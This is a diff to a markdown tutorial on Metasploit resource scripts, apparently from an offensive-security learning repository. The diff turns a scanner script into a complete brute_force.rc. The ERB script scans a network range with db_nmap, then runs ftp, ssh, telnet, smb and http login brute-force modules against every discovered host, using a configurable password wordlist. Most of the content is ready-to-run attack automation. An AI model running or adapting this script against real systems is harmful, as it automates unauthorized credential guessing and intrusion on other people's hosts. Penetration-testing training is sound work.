@@ -12,7 +12,6 @@
 | RC scripts in post exploitation | [resource scripts in post exploitation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-post-exploitation) | run migrate -n explorer.exe |
 | RC scripts in AutoRunScript | [resource scripts in AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-autorunscript) | set AutoRunScript /root/script.rc |
 | using ruby (ERB scripting) | [using ruby in RC (ERB scripting)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#using-ruby-in-rc-erb-scripting) | \<ruby\>framework.db.hosts.each do \|h\|\</ruby\> |
-| exercises with resource scripts | [exercises with resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#exercises) | exercises external links |
 
 <br />
 
@@ -255,6 +254,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
        This Metasploit RC file can be used to automate the exploitation process.
        In this example we are just checking msfdb connection status, list database
        hosts, services and export the contents of database to template.xml local file.
+
     Author:
        r00t-3xp10it  <pedroubuntu10[at]gmail.com>
     |
@@ -293,6 +293,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          This Metasploit RC file can be used to automate the exploitation process.
          In this example we are using db_nmap to populate msfdb database with hosts
          then trigger auxiliary/http/scanner modules againts all hosts inside db.
+
        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
@@ -317,9 +318,9 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
 
 <br /><br />
 
-<blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system. REMARK: This script its prepared to accept user inputs (RHOSTS) throuth setg global variable.</blockquote>
+<blockquote>Run auxiliary/exploit modules based on database (targets) ports found. Next resource script searchs inside msf database for targets open ports discover by db_nmap scan to sellect what auxiliary/exploits modules to run againts target system. REMARK: This script its prepared to accept user inputs (RHOSTS) and (USERPASS_FILE) throuth the setg global variable declarations, if none value has povided then this resource script will use default values.</blockquote>
 
-Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **scanner.rc**
+Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **brute_force.rc**
 ```
    <ruby>
       help = %Q|
@@ -327,9 +328,12 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
           This Metasploit RC file can be used to automate the exploitation process.
           In this example we are using db_nmap to populate msfdb database with hosts
           then trigger auxiliary/scanners based on target ports capture by db_nmap.
+
         Execute in msfconsole:
           setg RHOSTS <hosts-separated-by-spaces>
-          resource <path-to-script>/scanner.rc
+          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
+          resource <path-to-script>/brute_force.rc
+
         Author:
           r00t-3xp10it  <pedroubuntu10[at]gmail.com>
       |
@@ -339,8 +343,11 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
          run_single("setg RHOSTS 192.168.1.0/24")
       end
+      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
+         run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
+      end
 
-      run_single("db_nmap -sV -Pn -T4 -O -p 21,22,80,445 --script=banner.nse,smb-os-discovery.nse,http-headers.nse --open #{framework.datastore['RHOSTS']}")
+      run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,445 --script=smb-os-discovery.nse,http-headers.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
       run_single("services")
       print_good("## Reading msfdb database.")
       xhost = framework.db.hosts.map(&:address).join(' ')
@@ -355,7 +362,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("set THREADS 35")
               run_single("exploit")
               run_single("use auxiliary/scanner/ftp/ftp_login")
-              run_single("set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/cms400net_default_userpass.txt")
+              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
               run_single("set THREADS 105")
               run_single("exploit")
          end
@@ -363,8 +370,17 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          if xport =~ /22/i
               print_warning("## Target port: 22 ssh found")
               run_single("use auxiliary/scanner/ssh/ssh_login")
-              run_single("set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt")
-              run_single("set VERBOSE false")
+              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("exploit")
+         end
+
+         if xport =~ /23/i
+              print_warning("## Target port: 23 telnet found")
+              run_single("use auxiliary/scanner/telnet/telnet_version")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/telnet/telnet_login")
+              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("set THREADS 16")
               run_single("exploit")
          end
 
@@ -380,7 +396,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("set THREADS 16")
               run_single("exploit")
               run_single("use auxiliary/scanner/smb/smb_login")
-              run_single("set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/cms400net_default_userpass.txt")
+              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
               run_single("set THREADS 16")
               run_single("exploit")
          end
@@ -395,22 +411,18 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
               run_single("use auxiliary/scanner/http/dir_scanner")
               run_single("exploit")
               run_single("use auxiliary/scanner/http/http_login")
-              run_single("set VERBOSE false")
               run_single("exploit")
          end
       print_warning("## Cleaning Database.")
-      run_single("unsetg RHOSTS")
+      run_single("unsetg RHOSTS USERPASS_FILE")
       run_single("unset THREADS")
      run_single("services -d")
      run_single("hosts -d")
    </ruby>
 ```
-**Run the script:** msfconsole -r /root/scanner.rc
+**Run the script:** msfconsole -r /root/brute_force.rc
 
 <br /><br />
-
-/usr/share/metasploit-framework/data/wordlists/root_userpass.txt
-use auxiliary/scanner/ssh/ssh_login
 
 <blockquote>Run auxiliary snmp modules and nmap nse scripts againts sellected setg RHOSTS variable defined in msfconsole. Users just need to manually input target(s) ip address(s) into setg RHOSTS variable to point to the targets to be scanned.</blockquote>
 
@@ -422,9 +434,11 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
           This Metasploit RC file can be used to automate the exploitation process.
           In this example we are using msfconsole setg to add to msfdb database rhosts
           then trigger db_nmap nse scripts and msfconsole auxiliary modules againts rhosts.
+
         Execute in msfconsole:
           setg RHOSTS <hosts-separated-by-spaces>
           resource <path-to-script>/snmp_enum.rc
+
         Author:
           r00t-3xp10it  <pedroubuntu10[at]gmail.com>
       |
@@ -459,21 +473,6 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
 <br />
 
 ![pic](http://i67.tinypic.com/2dmi2w2.gif)
-
-#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
-
----
-
-<br /><br /><br />
-
-## EXERCISES
-
-- [exercise 1](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%204)<br />
-- [exercise 2](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%205)<br />
-- [exercise 3 (ERB)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%207)<br />
-- [exercise 4 (ERB)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%208)<br />
-
-<br />
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
 
